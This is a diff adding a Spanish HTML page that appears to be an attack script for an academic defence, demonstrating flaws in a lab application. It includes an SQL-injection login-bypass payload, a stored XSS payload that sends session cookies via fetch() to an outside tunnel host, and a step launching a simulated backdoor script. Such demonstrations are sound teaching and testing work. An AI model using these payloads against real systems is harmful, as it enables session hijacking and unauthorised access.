@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guion de Ataques y Explotación - Sofia Solutions</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #070d19;
+            --surface: rgba(13, 22, 41, 0.7);
+            --border: rgba(0, 255, 136, 0.15);
+            --green: #00ff88;
+            --cyan: #00d4ff;
+            --red: #ff4444;
+            --text: #e2e8f0;
+            --muted: #8892b0;
+            --glass-bg: rgba(10, 17, 34, 0.6);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 50% 0%, #0c1c38 0%, var(--bg) 70%);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 950px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 30px;
+        }
+
+        .badge {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid var(--red);
+            color: var(--red);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            display: inline-block;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--red), var(--cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: var(--muted);
+            font-size: 1.1rem;
+        }
+
+        .card {
+            background: var(--glass-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            color: var(--red);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: var(--cyan);
+            font-size: 1.2rem;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            margin-bottom: 15px;
+            color: #d1d5db;
+        }
+
+        .payload-box {
+            background: #11070d;
+            border: 1px solid rgba(255, 68, 68, 0.3);
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.95rem;
+            color: var(--red);
+            margin-bottom: 15px;
+            word-break: break-all;
+        }
+
+        .tech-box {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+
+        .tech-title {
+            font-weight: 700;
+            color: var(--green);
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        footer {
+            text-align: center;
+            color: var(--muted);
+            font-size: 0.85rem;
+            margin-top: 50px;
+            border-top: 1px solid var(--border);
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <span class="badge">Auditoría Ofensiva</span>
+            <h1>Guion de Ataques y Explotación</h1>
+            <p class="subtitle">Procedimiento técnico detallado paso a paso para la demostración de vulnerabilidades</p>
+        </header>
+
+        <div class="card">
+            <h2>💥 Ataque 1: Inyección SQL (Bypass de Autenticación)</h2>
+            <p>
+                Este ataque demuestra la explotación de consultas dinámicas que carecen de parametrización en el motor de base de datos PostgreSQL.
+            </p>
+            <h3>Procedimiento Paso a Paso:</h3>
+            <p>1. Navegue al formulario de autenticación en la Consola de Auditoría (<code>/consola</code>).</p>
+            <p>2. Introduzca el siguiente payload exacto en el campo de <strong>Correo Electrónico</strong>:</p>
+            <div class="payload-box">admin@sofia.local' OR '1'='1' --</div>
+            <p>3. Introduzca cualquier carácter en el campo de **Contraseña** (por ejemplo: <code>1234</code>) y envíe el formulario.</p>
+            <div class="tech-box">
+                <div class="tech-title">Explicación para el Tribunal</div>
+                La consulta del lado del servidor se concatena de forma directa, permitiendo que el operador <code>OR '1'='1'</code> fuerce a la base de datos a retornar verdadero incondicionalmente, saltando la comprobación hash de la contraseña y otorgando una sesión JWT de Administrador.
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>💥 Ataque 2: Scripting en Sitios Cruzados Persistente (Stored XSS)</h2>
+            <p>
+                Demostración del almacenamiento persistente de payloads javascript maliciosos en la base de datos para secuestrar credenciales de sesión activa de otros tenants.
+            </p>
+            <h3>Procedimiento Paso a Paso:</h3>
+            <p>1. Inicie sesión en un cliente (por ejemplo, <code>iberdrola@sofia.local</code>).</p>
+            <p>2. Acceda al envío de tickets de soporte técnico e inyecte el siguiente código javascript en el cuerpo del mensaje:</p>
+            <div class="payload-box">&lt;script&gt;fetch('https://sofia-n8n.serveousercontent.com/log?c=' + document.cookie)&lt;/script&gt;</div>
+            <p>3. Guarde el ticket. Cuando el administrador del SOC acceda a auditar los tickets de soporte, la cookie de sesión activa que almacena su Token JWT será exfiltrada al servidor del atacante.</p>
+            <div class="tech-box">
+                <div class="tech-title">Explicación para el Tribunal</div>
+                La falta de saneamiento y filtrado de entidades HTML permite guardar directamente scripts ejecutables en la base de datos, los cuales son renderizados por el navegador del administrador sin control de seguridad.
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>💥 Ataque 3: Persistencia Avanzada (Kit de Auditoría / Backdoor)</h2>
+            <p>
+                Demuestra el comportamiento de un atacante posterior al compromiso inicial para instalar canales persistentes de bajo ruido dentro del servidor backend.
+            </p>
+            <h3>Procedimiento Paso a Paso:</h3>
+            <p>1. Ejecute el lanzador local desde el directorio de scripts:</p>
+            <div class="payload-box">scripts/lanzar-rootkit.bat</div>
+            <p>2. El script `sofia-audit-framework.py` se conectará a la API Express y simulará la inyección de una puerta trasera en la base de datos PostgreSQL, la cual descarga información sensible de manera dosificada para evitar alarmas volumétricas.</p>
+            <div class="tech-box">
+                <div class="tech-title">Explicación para el Tribunal</div>
+                Esta simulación permite evaluar si las firmas defensivas heurísticas del WAF del SOC son capaces de correlacionar accesos no habituales procedentes de IPs ajenas al segmento corporativo y reportar alertas automáticas.
+            </div>
+        </div>
+
+        <footer>
+            © 2026 Sofia Solutions - Guion de Simulación de Ciberseguridad Ofensiva para Defensa Académica
+        </footer>
+    </div>
+</body>
+</html>
